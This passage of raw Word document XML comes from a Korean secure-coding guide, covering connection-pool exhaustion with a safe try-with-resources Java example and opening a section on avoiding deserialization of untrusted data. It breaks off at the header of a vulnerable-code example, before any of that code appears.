                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>풀이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>점진적으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고갈됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>일정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>커넥션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>풀이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모두</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소진되면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신규</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타임아웃</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실패하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>재시작</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복구되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>장애가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] try-with-resources: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>블록</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>종료</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>해제</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>try (Connection con = dataSource.getConnection();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     PreparedStatement ps = con.prepareStatement(sql)) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>ps.executeQuery();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">}  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모두</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해제</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>신뢰할</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>데이터의</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>역직렬화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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신뢰할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수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없는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데이터를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역직렬화하지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않도록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애플리케이션을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구성한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역직렬화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허용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클래스를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화이트리스트로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제한한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무제한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역직렬화</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
